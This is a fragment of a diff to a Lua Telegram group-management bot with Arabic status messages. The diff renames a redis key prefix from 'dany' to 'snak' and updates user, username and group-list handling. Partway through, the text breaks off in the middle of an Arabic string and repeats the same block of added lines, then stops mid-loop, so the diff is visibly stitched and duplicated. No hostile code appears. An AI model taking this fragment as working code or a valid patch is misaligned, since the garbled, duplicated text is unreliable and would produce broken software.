-	sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'•~** تم رفع آلنسـخه‏‏ آلآحتيآطـيه\n•~** حآليآ عدد مـجمـوعآتك هيه *'..redis:scard(dany..'group:ids')..'* ®️\n✓')
+	sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'• ** تم رفع النسخه‏‏ الاحتياطيه\n• ** حالياً عدد مجموعاتك هيه‏ *'..redis:scard(snak..'group:ids')..' .*\n')
 	end
 	elseif data.ID == "UpdateUser" then  
 	if data.user_.type_.ID == "UserTypeDeleted" then
 	print("¦ userTypeDeleted")
-	redis:srem(dany..'users',data.user_.id_)
+	redis:srem(snak..'users',data.user_.id_)
 	elseif data.user_.type_.ID == "UserTypeGeneral" then
-	local CheckUser = redis:hgetall(dany..'username:'..data.user_.id_).username
+	local CheckUser = redis:hgetall(snak..'username:'..data.user_.id_).username
 	if data.user_.username_  then 
 	USERNAME = '@'..data.user_.username_:gsub('_',[[\_]])
 	else
@@ -753,7 +764,7 @@ end
 	end	
 	if CheckUser and CheckUser ~= USERNAME  then
 	print("¦ Enter Update User ")
-	redis:hset(dany..'username:'..data.user_.id_,'username',USERNAME)
+	redis:hset(snak..'username:'..data.user_.id_,'username',USERNAME)
 	end 
 	end
 	elseif data.ID == "UpdateMessageEdited" then
@@ -765,7 +776,7 @@ end
 	end,nil)
 	elseif data.ID == "UpdateOption" and data.value_.value_ == "Ready" then
 	print(" ||  ------------------------[ Loading For loding list Chat ]--------------------- ||")
-	local groups = redis:smembers(dany..'group:ids')
+	local groups = redis:smembers(snak..'group:ids')
 	local GroupsIsFound = 0
 	for i = 1, #groups do 
 	GroupTitle(groups[i],function(arg,data)
@@ -785,7 +796,72 @@ end
 	print(GroupsIsFound..' : '..#groups..' : '..i)
 	if #groups == i then
 	
-	local pv = redis:smembers(dany..'users')
+	local pv = redis:smembers(snak..'users')
+	local NumPvDel = 0
+	for i = 1, #pv do
+	GroupTitle(pv[i],function(arg,data)
+	NumPvDel = NumPvDel + 1
+	print("Geting Ok : "..NumPvDel)
+	end)
+	end
+	
+	end
+	end)
+	end
+	
+
+	end
+	
+	
+end
+اتك هيه‏ *'..redis:scard(snak..'group:ids')..' .*\n')
+	end
+	elseif data.ID == "UpdateUser" then  
+	if data.user_.type_.ID == "UserTypeDeleted" then
+	print("¦ userTypeDeleted")
+	redis:srem(snak..'users',data.user_.id_)
+	elseif data.user_.type_.ID == "UserTypeGeneral" then
+	local CheckUser = redis:hgetall(snak..'username:'..data.user_.id_).username
+	if data.user_.username_  then 
+	USERNAME = '@'..data.user_.username_:gsub('_',[[\_]])
+	else
+	USERNAME = data.user_.first_name_..' '..(data.user_.last_name_ or "" )
+	end	
+	if CheckUser and CheckUser ~= USERNAME  then
+	print("¦ Enter Update User ")
+	redis:hset(snak..'username:'..data.user_.id_,'username',USERNAME)
+	end 
+	end
+	elseif data.ID == "UpdateMessageEdited" then
+	GetMsgInfo(data.chat_id_,data.message_id_,function(arg,data)
+	msg = data
+	msg.edited = true
+	data.text = (data.content_.text_ or false)
+	input_inFo(msg)  
+	end,nil)
+	elseif data.ID == "UpdateOption" and data.value_.value_ == "Ready" then
+	print(" ||  ------------------------[ Loading For loding list Chat ]--------------------- ||")
+	local groups = redis:smembers(snak..'group:ids')
+	local GroupsIsFound = 0
+	for i = 1, #groups do 
+	GroupTitle(groups[i],function(arg,data)
+	if data.code_ and data.code_ == 400 then
+	rem_data_group(groups[i])
+	print(" Del Group From list ")
+	else
+	if data.type_ and data.type_.channel_ 
+	and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
+	StatusLeft(groups[i],our_id)
+	rem_data_group(groups[i])
+	print(" Del Group From list ")
+	end
+	print(" Name Group : "..data.title_)
+	GroupsIsFound = GroupsIsFound + 1
+	end
+	print(GroupsIsFound..' : '..#groups..' : '..i)
+	if #groups == i then
+	
+	local pv = redis:smembers(snak..'users')
 	local NumPvDel = 0
 	for i = 1, #pv do
 	GroupTitle(pv[i],function(arg,data)
